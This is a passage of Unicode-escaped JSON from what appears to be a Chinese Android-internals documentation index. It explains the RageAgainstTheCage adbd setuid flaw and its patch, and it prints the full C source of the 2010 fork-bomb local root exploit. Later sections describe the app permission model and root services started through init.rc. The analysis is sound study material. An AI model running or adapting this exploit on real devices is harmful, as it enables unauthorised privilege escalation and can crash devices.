\u662fbusybox\uff0c\u8fd0\u884c\u671f\u5b83\u7684\u6743\u9650\u662froot\uff0c\u5f53\u7136\u4e5f\u6709\u6743\u9650\u6765\u63d0\u5347\u81ea\u5df1\u7684\u6743\u9650\uff09\u3002 \u518d\u5f3a\u8c03\u4e00\u4e0b\u4e0d\u5149root\u624b\u673a\u4e0asu\u9700\u8981\u8bbe\u7f6eSUID\uff0c\u6240\u6709\u7684Linux\u7cfb\u7edf\u4e0a\u7684su\u7a0b\u5e8f\u90fd\u9700\u8981\u8bbe\u7f6eSUID\u4f4d\u3002 \u6211\u4eec\u53d1\u73b0su\u4e5f\u8bbe\u7f6e\u4e86SUID\u4f4d\uff0c\u8fd9\u6837\u666e\u901a\u7528\u6237\u4e5f\u53ef\u4ee5\u8fd0\u884csu\u7a0b\u5e8f\uff0csu\u7a0b\u5e8f\u4f1a\u9a8c\u8bc1root \u5bc6\u7801\uff0c\u5982\u679c\u6b63\u786esu\u7a0b\u5e8f\u53ef\u4ee5\u628a\u7528\u6237\u6743\u9650\u63d0\u9ad8\u7684root\uff08\u56e0\u4e3a\u5176\u8bbe\u7f6eSUID\u4f4d\uff0c\u8fd0\u884c\u671f\u662froot\u6743\u9650\uff0c\u8fd9\u6837\u5176\u6709\u6743\u9650\u63d0\u5347\u81ea\u5df1\u7684\u6743\u9650\uff09\u3002 Android\u7cfb\u7edf\u7684\u7834\u89e3\u7684\u6839\u672c\u539f\u7406\u5c31\u662f\u66ff\u6362\u6389\u7cfb\u7edf\u4e2d\u7684su\u7a0b\u5e8f\uff0c\u56e0\u4e3a\u7cfb\u7edf\u4e2d\u7684\u9ed8\u8ba4su\u7a0b\u5e8f\u9700\u8981\u9a8c\u8bc1\u5b9e\u9645\u7528\u6237\u6743\u9650\uff08\u53ea\u6709root\u548cshell\u7528\u6237\u624d\u6709\u6743\u8fd0\u884c\u7cfb\u7edf\u9ed8\u8ba4\u7684su\u7a0b\u5e8f\uff0c\u5176\u4ed6\u7528\u6237\u8fd0\u884c\u90fd\u4f1a\u8fd4\u56de\u9519\u8bef\uff09\u3002\u800c\u7834\u89e3\u540e\u7684su\u5c06\u4e0d\u68c0\u67e5\u5b9e\u9645\u7528\u6237\u6743\u9650\uff0c\u8fd9\u6837\u666e\u901a\u7684\u7528\u6237\u4e5f\u5c06\u53ef\u4ee5\u8fd0\u884csu\u7a0b\u5e8f\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7su\u7a0b\u5e8f\u5c06\u81ea\u5df1\u7684\u6743\u9650\u63d0\u5347\u3002 root\u7834\u89e3\u6ca1\u6709\u5229\u7528\u4ec0\u4e48Linux\u5185\u6838\u6f0f\u6d1e\uff08Linux\u5185\u6838\u4e0d\u53ef\u80fd\u6709\u8fd9\u4e48\u5927\u7684\u6f0f\u6d1e\u5b58\u5728\uff09\uff0c\u53ef\u4ee5\u7406\u89e3\u6210root\u7834\u89e3\u5c31\u662f\u5728\u4f60\u7cfb\u7edf\u4e2d\u690d\u5165\u201c\u6728\u9a6csu\u201d\uff0c\u8bf4\u5b83\u662f\u201c\u6728\u9a6c\u201d\u4e00\u70b9\u513f\u90fd\u4e0d\u4e3a\u8fc7\uff0c\u5047\u5982\u6076\u610f\u7a0b\u5e8f\u5728\u7cfb\u7edf\u4e2d\u8fd0\u884c\u4e5f\u53ef\u4ee5\u901a\u8fc7su\u6765\u63d0\u5347\u81ea\u5df1\u7684\u6743\u9650\u7684\u8fd9\u6837\u7684\u7ed3\u679c\u5c06\u4f1a\u662f\u707e\u96be\u6027\u7684\u3002\u6240\u4ee5\u4e00\u822c\u60c5\u51b5\u4e0broot\u8fc7\u624b\u673a\u90fd\u4f1a\u6709\u4e00\u4e2aSuperUser\u5e94\u7528\u7a0b\u5e8f\u6765\u8ba9\u7528\u6237\u7ba1\u7406\u5141\u8bb8\u8c01\u83b7\u5f97root\u6743\u9650.\u4f46\u662f\u8981\u66ff\u6362\u6389\u7cfb\u7edf\u4e2dsu\u7a0b\u5e8f\u672c\u8eab\u5c31\u662f\u9700\u8981root\u6743\u9650\u7684\uff0c\u600e\u6837\u5728root\u7834\u89e3\u8fc7\u7a0b\u4e2d\u83b7\u5f97root\u6743\u9650\uff0c\u5047\u8bbe\u9700\u8981\u7834\u89e3\u7684Android\u7cfb\u7edf\u5177\u5907\u5982\u4e0b\u6761\u4ef6\uff1a 1\u3001\u53ef\u4ee5\u901a\u8fc7adb\u8fde\u63a5\u5230\u8bbe\u5907\uff0c\u4e00\u822c\u610f\u5473\u7740\u9a71\u52a8\u7a0b\u5e8f\u5df2\u7ecf\u5b89\u88c5\u3002 2\u3001\u4f46\u662fadb\u83b7\u5f97\u7528\u6237\u6743\u9650\u662fshell\u7528\u6237\uff0c\u800c\u4e0d\u662froot\u3002 \u5148\u4e86\u89e3\u4e00\u4e0badb\u5de5\u5177\uff0c\u8bbe\u5907\u7aef\u6709adbd\u670d\u52a1\u7a0b\u5e8f\u540e\u53f0\u8fd0\u884c\uff0c\u4e3a\u5f00\u53d1\u673a\u7684adb\u7a0b\u5e8f\u63d0\u4f9b\u670d\u52a1\uff0cadbd\u7684\u6743\u9650\uff0c\u51b3\u5b9a\u4e86adb\u7684\u6743\u9650\u3002\u5177\u4f53\u7528\u6237\u53ef\u67e5\u770b/system/core/adb\u4e0b\u7684\u6e90\u7801\uff0c\u67e5\u770bAndroid.mk\u4f60\u5c06\u4f1a\u53d1\u73b0adb\u548cadbd\u5176\u5b9e\u662f\u4e00\u4efd\u4ee3\u7801\uff0c\u7136\u540e\u901a\u8fc7\u5b8f\u6765\u7f16\u8bd1\u3002 \u67e5\u770badb.c\u7684adb_main\u51fd\u6570\u4f60\u5c06\u4f1a\u53d1\u73b0adbd\u4e2d\u6709\u5982\u4e0b\u4ee3\u7801\uff1a 1:int adb_main(int is_daemon) 2: { 3: ...... 4: property_get(\"ro.secure\", value,\"\"); 5: if (strcmp(value,\"1\") == 0) { 6: // don't run as root if ro.secure is set... 7: secure = 1; 8: ...... 9: } 10: 11: if (secure) { 12: ...... 13: setgid(AID_SHELL); 14: setuid(AID_SHELL); 15: ...... 16: } 17: } \u4ece\u4e2d\u6211\u4eec\u53ef\u4ee5\u770b\u5230adbd\u4f1a\u68c0\u6d4b\u7cfb\u7edf\u7684ro.secure\u5c5e\u6027\uff0c\u5982\u679c\u8be5\u5c5e\u6027\u4e3a1\u5219\u5c06\u4f1a\u628a\u81ea\u5df1\u7684\u7528\u6237\u6743\u9650\u964d\u7ea7\u6210shell\u7528\u6237\u3002\u4e00\u822c\u8bbe\u5907\u51fa\u5382\u7684\u65f6\u5019\u5728/default.prop\u6587\u4ef6\u4e2d\u90fd\u4f1a\u6709\uff1a 1: ro.secure=1 \u8fd9\u6837\u5c06\u4f1a\u4f7fadbd\u542f\u52a8\u7684\u65f6\u5019\u81ea\u52a8\u964d\u7ea7\u6210shell\u7528\u6237\u3002 \u7136\u540e\u6211\u4eec\u518d\u4ecb\u7ecd\u4e00\u4e0badbd\u5728\u4ec0\u4e48\u65f6\u5019\u542f\u52a8\u7684\u5462\uff1f\u7b54\u6848\u662f\u5728init.rc\u4e2d\u914d\u7f6e\u7684\u7cfb\u7edf\u670d\u52a1\uff0c\u7531init\u8fdb\u7a0b\u542f\u52a8\u3002\u6211\u4eec\u67e5\u770binit.rc\u4e2d\u6709\u5982\u4e0b\u5185\u5bb9\uff1a 1: # adbd is controlled by the persist.service.adb.enable system property 2: service adbd /sbin/adbd 3: disabled \u5bf9Android\u5c5e\u6027\u7cfb\u7edf\u5c11\u6709\u4e86\u89e3\u7684\u670b\u53cb\u5c06\u4f1a\u77e5\u9053\uff0c\u5728init.rc\u4e2d\u914d\u7f6e\u7684\u7cfb\u7edf\u670d\u52a1\u542f\u52a8\u7684\u65f6\u5019\u90fd\u662froot\u6743\u9650\uff08\u56e0\u4e3ainit\u8fdb\u884c\u662froot\u6743\u9650\uff0c\u5176\u5b50\u7a0b\u5e8f\u4e5f\u662froot\uff09\u3002\u7531\u6b64\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u5728adbd\u7a0b\u5e8f\u5728\u6267\u884c\uff1a 1:/* then switch user and group to \"shell\" */ 2: setgid(AID_SHELL); 3: setuid(AID_SHELL); \u4ee3\u7801\u4e4b\u524d\u90fd\u662froot\u6743\u9650\uff0c\u53ea\u6709\u6267\u884c\u8fd9\u4e24\u53e5\u4e4b\u540e\u624d\u53d8\u6210shell\u6743\u9650\u7684\u3002 \u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u5f15\u51faroot\u7834\u89e3\u8fc7\u7a0b\u4e2d\u83b7\u5f97root\u6743\u9650\u7684\u65b9\u6cd5\u4e86\uff0c\u90a3\u5c31\u662f\u8ba9\u4e0a\u9762setgid\u548csetuid\u51fd\u6570\u6267\u884c\u5931\u8d25\uff0c\u4e5f\u5c31\u662f\u964d\u7ea7\u5931\u8d25\uff0c\u90a3\u5c31\u7ee7\u7eed\u5728root\u6743\u9650\u4e0b\u9762\u8fd0\u884c\u4e86\u3002 \u8fd9\u91cc\u9762\u505a\u4e00\u4e2a\u7b80\u5355\u8bf4\u660e\uff1a 1\u3001\u51fa\u5382\u8bbe\u7f6e\u7684ro.secure\u5c5e\u6027\u4e3a1\uff0c\u5219adbd\u4e5f\u5c06\u8fd0\u884c\u5728shell\u7528\u6237\u6743\u9650\u4e0b\uff1b 2\u3001adb\u5de5\u5177\u521b\u5efa\u7684\u8fdb\u7a0bratc\u4e5f\u8fd0\u884c\u5728shell\u7528\u6237\u6743\u9650\u4e0b\uff1b 3\u3001ratc\u4e00\u76f4\u521b\u5efa\u5b50\u8fdb\u7a0b\uff08ratc\u521b\u5efa\u7684\u5b50\u7a0b\u5e8f\u4e5f\u5c06\u4f1a\u8fd0\u884c\u5728shell\u7528\u6237\u6743\u9650\u4e0b\uff09\uff0c\u7d27\u63a5\u7740\u5b50\u7a0b\u5e8f\u9000\u51fa\uff0c\u5f62\u6210\u50f5\u5c38\u8fdb\u7a0b\uff0c\u5360\u7528shell\u7528\u6237\u7684\u8fdb\u7a0b\u8d44\u6e90\uff0c\u76f4\u5230\u5230\u8fbeshell\u7528\u6237\u7684\u8fdb\u7a0b\u6570\u4e3aRLIMIT_NPROC\u7684\u65f6\u5019\uff08\u5305\u62ecadbd\u3001ratc\u53ca\u5176\u5b50\u7a0b\u5e8f\uff09\uff0c\u8fd9\u662fratc\u5c06\u4f1a\u521b\u5efa\u5b50\u8fdb\u7a0b\u5931\u8d25\u3002\u8fd9\u65f6\u5019\u6740\u6389adbd\uff0cadbd\u8fdb\u7a0b\u56e0\u4e3a\u662fAndroid\u7cfb\u7edf\u670d\u52a1\uff0c\u5c06\u4f1a\u88abAndroid\u7cfb\u7edf\u81ea\u52a8\u91cd\u542f\uff0c\u8fd9\u65f6\u5019ratc\u4e5f\u5728\u7ade\u4e89\u4ea7\u751f\u5b50\u7a0b\u5e8f\u3002\u5728adbd\u7a0b\u5e8f\u6267\u884c\u4e0a\u9762setgid\u548csetuid\u4e4b\u524d\uff0cratc\u5df2\u7ecf\u521b\u5efa\u4e86\u4e00\u4e2a\u65b0\u7684\u5b50\u8fdb\u7a0b\uff0c\u90a3\u4e48shell\u7528\u6237\u7684\u8fdb\u7a0b\u9650\u989d\u5df2\u7ecf\u8fbe\u5230\uff0c\u5219adbd\u8fdb\u7a0b\u6267\u884csetgid\u548csetuid\u5c06\u4f1a\u5931\u8d25\u3002\u6839\u636e\u4ee3\u7801\u6211\u4eec\u53d1\u73b0\u5931\u8d25\u4e4b\u540eadbd\u5c06\u4f1a\u7ee7\u7eed\u6267\u884c\u3002\u8fd9\u6837adbd\u8fdb\u7a0b\u5c06\u4f1a\u8fd0\u884c\u5728root\u6743\u9650\u4e0b\u9762\u4e86\u3002 \u8fd9\u65f6\u91cd\u65b0\u7528adb\u8fde\u63a5\u8bbe\u5907\uff0c\u5219adb\u5c06\u4f1a\u8fd0\u884c\u5728root\u6743\u9650\u4e0b\u9762\u4e86\u3002 \u901a\u8fc7\u4e0a\u9762\u7684\u4ecb\u7ecd\u6211\u4eec\u53d1\u73b0\u5229\u7528RageAgainstTheCage\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u4f7fadbd\u83b7\u5f97root\u6743\u9650\uff0c\u4e5f\u5c31\u662fadb\u83b7\u5f97\u4e86root\u6743\u9650\u3002\u62ff\u5230root\u6743\u9650\u5269\u4e0b\u7684\u95ee\u9898\u5c31\u597d\u529e\u4e86\uff0c\u590d\u5236\u7834\u89e3\u4e4b\u540e\u7684su\u7a0b\u5e8f\u5230\u7cfb\u7edf\u4e2d\uff0c\u90fd\u662f\u6ca1\u6709\u4ec0\u4e48\u6280\u672f\u542b\u91cf\u7684\u4e8b\u60c5\u4e86\u3002 \u5176\u5b9e\u5835\u4f4fadbd\u7684\u8fd9\u4e2a\u6f0f\u6d1e\u5176\u5b9e\u4e5f\u633a\u7b80\u5355\u7684\uff0c\u65b0\u7248\u672c\u5df2\u7ecf\u52a0\u4e24\u4e2a\u8fd9\u4e2a\u8865\u4e01\u3002 1:/* then switch user and group to \"shell\" */ 2:if (setgid(AID_SHELL) != 0) { 3: exit(1); 4: } 5:if (setuid(AID_SHELL) != 0) { 6: exit(1); 7: } \u5982\u679c\u53d1\u73b0setgid\u548csetuid\u51fd\u6570\u6267\u884c\u5931\u8d25\uff0c\u5219adbd\u8fdb\u7a0b\u5f02\u5e38\u9000\u51fa\uff0c\u5c31\u628a\u8fd9\u4e2a\u6f0f\u6d1e\u7ed9\u5835\u4e0a\u4e86\u3002 http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-2607 http://blog.claudxiao.net/wp-content/uploads/2011/04/rageagainstthecage.c /* android 1.x/2.x adb setuid() root exploit * (C) 2010 The Android Exploid Crew * * Needs to be executed via adb -d shell. It may take a while until * all process slots are filled and the adb connection is reset. * * !!!This is PoC code for educational purposes only!!! * If you run it, it might crash your device and make it unusable! * So you use it at your own risk! */ #include <stdio.h> #include <sys/types.h> #include <sys/time.h> #include <sys/resource.h> #include <unistd.h> #include <fcntl.h> #include <errno.h> #include <string.h> #include <signal.h> #include <stdlib.h> void die(const char *msg) { perror(msg); exit(errno); } pid_t find_adb() { char buf[256]; int i = 0, fd = 0; pid_t found = 0; for (i = 0; i < 32000; ++i) { sprintf(buf, \"/proc/%d/cmdline\", i); if ((fd = open(buf, O_RDONLY)) < 0) continue; memset(buf, 0, sizeof(buf)); read(fd, buf, sizeof(buf) - 1); close(fd); if (strstr(buf, \"/sbin/adb\")) { found = i; break; } } return found; } void restart_adb(pid_t pid) { kill(pid, 9); } void wait_for_root_adb(pid_t old_adb) { pid_t p = 0; for (;;) { p = find_adb(); if (p != 0 && p != old_adb) break; sleep(1); } sleep(5); kill(-1, 9); } int main(int argc, char **argv) { pid_t adb_pid = 0, p; int pids = 0, new_pids = 1; int pepe[2]; char c = 0; struct rlimit rl; printf(\"[*] CVE-2010-EASY Android local root exploit (C) 2010 by 743C\\n\\n\"); printf(\"[*] checking NPROC limit ...\\n\"); if (getrlimit(RLIMIT_NPROC, &rl) < 0) die(\"[-] getrlimit\"); if (rl.rlim_cur == RLIM_INFINITY) { printf(\"[-] No RLIMIT_NPROC set. Exploit would just crash machine. Exiting.\\n\"); exit(1); } printf(\"[+] RLIMIT_NPROC={%lu, %lu}\\n\", rl.rlim_cur, rl.rlim_max); printf(\"[*] Searching for adb ...\\n\"); adb_pid = find_adb(); if (!adb_pid) die(\"[-] Cannot find adb\"); printf(\"[+] Found adb as PID %d\\n\", adb_pid); printf(\"[*] Spawning children. Dont type anything and wait for reset!\\n\"); printf(\"[*]\\n[*] If you like what we are doing you can send us PayPal money to\\n\" \"[*] 7-4-3-C@web.de so we can compensate time, effort and HW costs.\\n\" \"[*] If you are a company and feel like you profit from our work,\\n\" \"[*] we also accept donations > 1000 USD!\\n\"); printf(\"[*]\\n[*] adb connection will be reset. restart adb server on desktop and re-login.\\n\"); sleep(5); if (fork() > 0) exit(0); setsid(); pipe(pepe); /* generate many (zombie) shell-user processes so restarting * adb's setuid() will fail. * The whole thing is a bit racy, since when we kill adb * there is one more process slot left which we need to * fill before adb reaches setuid(). Thats why we fork-bomb * in a seprate process. */ if (fork() == 0) { close(pepe[0]); for (;;) { if ((p = fork()) == 0) { exit(0); } else if (p < 0) { if (new_pids) { printf(\"\\n[+] Forked %d childs.\\n\", pids); new_pids = 0; write(pepe[1], &c, 1); close(pepe[1]); } } else { ++pids; } } } close(pepe[1]); read(pepe[0], &c, 1); restart_adb(adb_pid); if (fork() == 0) { fork(); for (;;) sleep(0x743C); } wait_for_root_adb(adb_pid); return 0; }","title":"Android\u7cfb\u7edfroot\u7834\u89e3\u539f\u7406\u5206\u6790"},{"location":"Android/Android%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E5%92%8Croot%E6%9D%83%E9%99%90/#android_1","text":"\u5728Android\u7cfb\u7edf\u4e2d\uff0c\u7cfb\u7edf\u4e3a\u6bcf\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\uff08apk\uff09\u521b\u5efa\u4e86\u4e00\u4e2a\u7528\u6237\u548c\u7ec4\u3002\u8fd9\u4e2a\u7528\u6237\u548c\u7ec4\u90fd\u662f\u53d7\u9650\u7528\u6237\uff0c\u4e0d\u80fd\u8bbf\u95ee\u7cfb\u7edf\u7684\u6570\u636e\uff0c\u53ea\u80fd\u8bbf\u95ee\u81ea\u5df1\u7684\u6587\u4ef6\u548c\u76ee\u5f55\uff0c\u5f53\u7136\u5b83\u4e5f\u4e0d\u80fd\u8bbf\u95ee\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u7684\u6570\u636e\u3002\u8fd9\u6837\u8bbe\u8ba1\u53ef\u4ee5\u5c3d\u53ef\u80fd\u5730\u4fdd\u62a4\u5e94\u7528\u7a0b\u5e8f\u7684\u79c1\u6709\u6570\u636e\uff0c\u589e\u5f3a\u7cfb\u7edf\u7684\u5b89\u5168\u6027\u548c\u5065\u58ee\u6027\u3002 \u4f46\u662f\u6709\u4e00\u4e9b\u5e94\u7528\u7a0b\u5e8f\u662f\u9700\u8981\u8bbf\u95ee\u4e00\u4e9b\u7cfb\u7edf\u8d44\u6e90\u7684\u3002\u6bd4\u5982Setting\u7a0b\u5e8f\uff0c\u5b83\u9700\u8981\u8bbf\u95eeWiFi\uff0c\u5728\u7cfb\u7edf\u4e2d\u521b\u5efa\u5220\u9664\u6587\u4ef6\u7b49\u7b49\u64cd\u4f5c\u3002\u600e\u6837\u505a\u5230\u8fd9\u4e00\u70b9\u513f\u5462\uff1fAndroid\u901a\u8fc7\u4e00\u5b9a\u9014\u5f84\u53ef\u4ee5\u83b7\u5f97system\u6743\u9650\u3002\u83b7\u5f97system\u7528\u6237\u6743\u9650\uff0c\u9700\u8981\u4ee5\u4e0b\u6b65\u9aa4\uff1a 1. \u5728\u5e94\u7528\u7a0b\u5e8f\u7684AndroidManifest.xml\u4e2d\u7684manifest\u8282\u70b9\u4e2d\u52a0\u5165android:sharedUserId=\"android.uid.system\"\u8fd9\u4e2a\u5c5e\u6027\u3002 2. \u4fee\u6539Android.mk\u6587\u4ef6\uff0c\u52a0\u5165LOCAL_CERTIFICATE := platform\u8fd9\u4e00\u884c 3. \u4f7f\u7528mm\u547d\u4ee4\u6765\u7f16\u8bd1\uff0c\u751f\u6210\u7684apk\u5c31\u6709\u4fee\u6539\u7cfb\u7edf\u65f6\u95f4\u7684\u6743\u9650\u4e86\u3002 \u4e00\u822c\u60c5\u51b5\u4e0bsystem\u7528\u6237\u53ef\u4ee5\u5728\u7cfb\u7edf\u4e2d\u521b\u5efa\u548c\u5220\u9664\u6587\u4ef6\uff0c\u8bbf\u95ee\u8bbe\u5907\u7b49\u7b49\u3002\u4f46\u662f\u6709\u4e9b\u60c5\u51b5\u4e0bsystem\u6743\u9650\u8fd8\u662f\u4e0d\u591f\u7684\u3002\u6bd4\u5982\uff1a\u8bbe\u7f6e\u7f51\u5361IP\u5730\u5740\uff0cifconfig\u547d\u4ee4\u662f\u9700\u8981root\u6743\u9650\u7684\u3002\u6211\u53ef\u4ee5\u5f88\u80af\u5b9a\u7684\u8bf4\uff0c\u5728Android\u4e0b\u9762\u5e94\u7528\u7a0b\u5e8f\u662f\u6ca1\u6709\u53ef\u80fd\u62ff\u5230root\u6743\u9650\u7684\u3002\u4f46\u662f\u5982\u679c\u6211\u7684\u5e94\u7528\u7a0b\u5e8f\u9700\u8981root\u6743\u9650\u600e\u4e48\u529e\u5462\uff1f\u53ea\u80fd\u60f3\u529e\u6cd5\u7ed5\u822c\u8fc7\u53bb\u3002\u5c31\u4ee5\u6211\u7684\u95ee\u9898\u4e3a\u4f8b\uff0c\u8bbe\u7f6e\u7f51\u5361IP\u5730\u5740\uff0croot\u6743\u9650\u4e0b\u9762\u547d\u4ee4\u4e3a\uff1a ifconfig eth0 192.168.1.188 \u5728\u666e\u901a\u7528\u6237\u6216\u8005system\u7528\u6237\u6743\u9650\u4e0b\u9762\u8fd9\u6761\u547d\u4ee4\u662f\u4e0d\u8d77\u4f5c\u7528\u7684\uff0c\u4f46\u662f\u4e0d\u4f1a\u8fd4\u56de\u5931\u8d25\u548c\u5f02\u5e38\uff0c\u90a3\u4e48\u600e\u6837\u5b9e\u73b0\u8fd9\u4e2a\u529f\u80fd\u5462\u3002 1\u3001\u7cfb\u7edf\u542f\u52a8\u7684\u65f6\u5019init\u8fdb\u7a0b\u521b\u5efa\u4e00\u4e2a\u540e\u53f0\u8fdb\u7a0b\uff0c\u8be5\u8fdb\u7a0b\u5904\u4e8eroot\u7528\u6237\u6743\u9650\u4e0b\u9762\u3002\u7528\u6765\u76d1\u542c\u7cfb\u7edf\u4e2d\u5e94\u7528\u7a0b\u5e8f\u7684\u8bf7\u6c42\uff08\u53ef\u4ee5\u7528socket\u5b9e\u73b0\uff09\uff0c\u5e76\u4ee3\u5176\u5b8c\u6210\u3002\u8fd9\u6837\u5e94\u7528\u7a0b\u5e8f\u5c31\u53ef\u4ee5\u6267\u884croot\u7528\u6237\u6743\u9650\u7684\u4efb\u52a1\u4e86\u3002 2\u3001\u5b9e\u73b0\u4e00\u4e2a\u865a\u62df\u7684\u8bbe\u5907\uff0c\u8be5\u8bbe\u5907\u7684\u529f\u80fd\u5c31\u662f\u5728\u5185\u6838\u6001\u5e2e\u5e94\u7528\u7a0b\u5e8f\u6267\u884c\u76f8\u5e94\u7684\u547d\u4ee4\u3002Linux\u5185\u6838\u6001\u6ca1\u6709\u6743\u9650\u7684\u95ee\u9898\u4e86\u3002\u80af\u5b9a\u53ef\u4ee5\u6267\u884c\u6210\u529f\u3002 \u89e3\u51b3\u8bbe\u7f6e\u7f51\u5361IP\u5730\u5740\u95ee\u9898\u65f6\uff0c\u9009\u62e9\u662f\u540e\u8005\u76f8\u5bf9\u6765\u8bf4\u8bbe\u8ba1\u6bd4\u8f83\u7b80\u5355\u3002","title":"Android\u7a0b\u5e8f\u7684\u5b89\u5168\u7cfb\u7edf"},{"location":"Android/Android%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E5%92%8Croot%E6%9D%83%E9%99%90/#androidinitrc-serviceroot","text":"\u53d1\u5e03\u4e8e: \u60f3\u5728android\u5e94\u7528\u7a0b\u5e8f\u4e2d\u52a8\u6001mount\u4e00\u4e2aNFS\u7684\u7cfb\u7edf\uff0c\u4f46\u662f\u6267\u884cmount\u547d\u4ee4\u5fc5\u987b\u8981root\u6743\u9650\u624d\u53ef\u4ee5\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u5728Android\u7684APK\u5c42\u662f\u4e0d\u80fd\u83b7\u5f97root\u6743\u9650\u7684\u3002 \u4e0a\u4e00\u8282\u63d0\u5230\u5b9e\u73b0\u7531init\u542f\u52a8\u7684Service\uff0c\u6765\u5e2e\u52a9Android\u5e94\u7528\u7a0b\u5e8f\u6267\u884croot\u6743\u9650\u7684\u547d\u4ee4\u6216\u8005\u5b9e\u73b0\u4e00\u4e2a\u865a\u62df\u8bbe\u5907\uff0c\u8fd9\u4e2a\u8bbe\u5907\u5e2e\u52a9Android\u5e94\u7528\u7a0b\u5e8f\u6267\u884croot\u6743\u9650\u7684\u547d\u4ee4\u3002 \u672c\u6587\u5c06\u4f1a\u9009\u62e9\u7b2c\u4e00\u79cd\u6765\u89e3\u51b3Android\u5e94\u7528\u7a0b\u5e8fmount NFS\u6587\u4ef6\u7cfb\u7edf\u7684\u95ee\u9898\u3002 Init.rc Service \u5728Android\u7cfb\u7edfinit.rc\u4e2d\u5b9a\u4e49\u5f88\u591aService\uff0cInit.rc\u4e2d\u5b9a\u4e49\u7684Service\u5c06\u4f1a\u88abInit\u8fdb\u7a0b\u521b\u5efa\uff0c\u8fd9\u6837\u5c06\u53ef\u4ee5\u83b7\u5f97root\u6743\u9650\u3002 \u8bbe\u7f6e\u7cfb\u7edf\u5c5e\u6027\u201cctl.start\u201d\uff0c\u628a\u201cctl.start\u201d\u8bbe\u7f6e\u4e3a\u4f60\u8981\u8fd0\u884c\u7684Service\uff0c\u5047\u8bbe\u4e3a\u201cxxx\u201d\uff0cAndroid\u7cfb\u7edf\u5c06\u4f1a\u5e2e\u4f60\u8fd0\u884c\u201cctl.start\u201d\u7cfb\u7edf\u5c5e\u6027\u4e2d\u6307\u5b9a\u7684Service\u3002\u90a3\u4e48\u8fd0\u884c\u7ed3\u679cinit\u8fdb\u7a0b\u4f1a\u5199\u5165\u547d\u540d\u4e3a\u201cinit.svc.+xxx\u201d\u7684\u7cfb\u7edf\u5c5e\u6027\u4e2d\uff0c\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u53c2\u8003\u67e5\u9605\u8fd9\u4e2a\u503c\u6765\u786e\u5b9aService xxx\u6267\u884c\u7684\u60c5\u51b5\u3002 Android\u7cfb\u7edf\u5c5e\u6027(property)\u6743\u9650 \u96be\u9053Android\u5c5e\u6027\u201cctl.start\u201d\u4e0d\u662f\u6240\u6709\u8fdb\u7a0b\u90fd\u53ef\u4ee5\u8bbe\u7f6e\u7684\uff0c\u89c1property_service.c\u4e2d\u7684\u6e90\u7801\uff0c\u8bbe\u7f6eAndroid\u7cfb\u7edf\u5c5e\u6027\u7684\u51fd\u6570\u4e3ahandle_property_set_fd(),\u4ece\u6e90\u7801\u4e2d\u53ef\u4ee5\u53d1\u73b0\u5982\u679c\u8bbe\u7f6e\u201cctl.\u201d\u5f00\u5934\u7684Android\u7cfb\u7edf\u5c5e\u6027\uff0c\u5c06\u4f1a\u8c03\u7528check_control_perms\u51fd\u6570\u6765\u68c0\u67e5\u8c03\u7528\u8005\u7684\u6743\u9650\uff0c\u53ea\u6709root\u6743\u9650\u548csystem\u6743\u9650\u7684\u5e94\u7528\u7a0b\u5e8f\u624d\u53ef\u4ee5\u4fee\u6539\u201cctl.\u201d\u5f00\u5934\u7684Android\u7cfb\u7edf\u5c5e\u6027\u3002\u5426\u5219\u5c06\u4f1a\u68c0\u67e5control_perms\u5168\u5c40\u53d8\u91cf\u4e2d\u7684\u5b9a\u4e49\u6743\u9650\u548cService\u3002 \u4ece\u4ee3\u7801\u4e2d\u53ef\u4ee5\u770b\u5230\uff0c\u4efb\u4f55\u4e0d\u4ee5property_perms[] \u4e2d\u5b9a\u4e49\u7684\u524d\u7f00\u5f00\u5934\u7684property \u662f\u65e0\u6cd5\u88ab\u9664root\u4ee5\u5916\u7684\u7528\u6237\u8bbf\u95ee\u7684\uff0c\u5305\u62ecsystem\u7528\u6237\u3002 \u5b9e\u4f8b \u4e0b\u9762\u4ee5\u4e0a\u9762\u63d0\u51fa\u7684mount nfs\u6587\u4ef6\u7cfb\u7edf\u4e3a\u4f8b\u8bf4\u660e\uff1a A\uff0e \u9996\u5148\u5b9a\u4e49\u4e00\u4e2a\u6267\u884cmount\u7684\u811a\u672c\uff0c\u6211\u628a\u5b83\u4f4d\u4e8e/system/etc/mount_nfs.sh\uff0c\u5b9a\u4e49\u5982\u4e0b\uff1a 1: #\uff01/system/bin/sh 2: 3: /system/bin/busybox mount -o rw,nolock -t nfs 192.168.1.6:/nfs_srv /data/mnt \u4e0d\u8981\u5fd8\u4e86\u628a\u5b83\u52a0\u4e0a\u53ef\u6267\u884c\u6743\u9650\u3002 B\uff0e \u5728init.rc\u4e2d\u52a0\u5165\u4e00\u4e2aService\u5b9a\u4e49\uff0c\u5b9a\u4e49\u5982\u4e0b\uff1a 1: service mount_nfs /system/etc/mount_nfs.sh 2: oneshot 3: disabled C\uff0e \u8ba9\u81ea\u5df1\u7684\u5e94\u7528\u7a0b\u5e8f\u83b7\u5f97system\u6743\u9650,\u65b9\u6cd5\u89c1\u524d\u9762\u7ae0\u8282 D. \u5728\u81ea\u5df1\u5e94\u7528\u7a0b\u5e8f\u4e2d\u8bbe\u7f6eSystem\u7cfb\u7edf\u5c5e\u6027\u201cctl.start\u201d\u4e3a\u201cmount_nfs\u201d\uff0c\u8fd9\u6837Android\u7cfb\u7edf\u5c06\u4f1a\u5e2e\u6211\u4eec\u8fd0\u884cmount_nfs\u7cfb\u7edf\u5c5e\u6027\u4e86\u3002\u4e0d\u80fd\u591f\u8c03\u7528System.getProperty\uff0c\u8fd9\u4e2a\u51fd\u6570\u53ea\u662f\u4fee\u6539JVM\u4e2d\u7684\u7cfb\u7edf\u5c5e\u6027\u3002\u53ea\u80fd\u8c03\u7528android.os.SystemProperties\uff0c\u6700\u7ec8\u901a\u8fc7JNI\u8c03\u7528C/C++\u5c42\u7684API property_get\u548cproperty_set\u51fd\u6570\u3002 SystemProperties.set(\"ctl.start\",\"mount_nfs\"); E. 